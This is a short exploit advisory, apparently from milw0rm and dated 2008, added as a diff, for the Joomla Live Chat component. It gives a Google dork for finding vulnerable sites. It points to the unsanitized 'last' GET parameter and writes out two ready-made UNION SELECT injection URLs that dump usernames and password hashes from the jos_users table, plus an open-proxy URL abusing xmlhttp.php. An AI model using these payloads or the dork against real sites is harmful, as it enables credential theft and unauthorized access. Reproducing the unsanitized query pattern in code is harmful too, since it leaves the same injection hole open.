@@ -1,0 +1,28 @@
+Joomla Live Chat
+
+http://www.joompolitan.com/livechat.html
+
+Google Dork: allinurl:option=com_livechat
+
+author: jdc
+
+
+SQL Injections:
+
+administrator/components/com_livechat/getChat.php && administrator/components/com_livechat/getSavedChatRooms.php don't sanitize the variable 'last':
+
+
+$last = (isset($_GET['last']) && $_GET['last'] != '') ? $_GET['last'] : 0;
+--------------------------------------------------------^
+
+administrator/components/com_livechat/getChat.php?chat=0&last=1%20union%20select%201,unhex(hex(concat(username,0x3a,password))),3,4%20from%20jos_users
+
+administrator/components/com_livechat/getSavedChatRooms.php?chat=0&last=1%20union%20select%201,unhex(hex(concat(username,0x3a,password))),3%20from%20jos_users
+
+
+Open Proxy ( sends HTTP_FORWARDED ):
+
+administrator/components/com_livechat/xmlhttp.php?GET$01$2$3$4$5$http://www.google.com
+
+
+# milw0rm.com [2008-12-12]
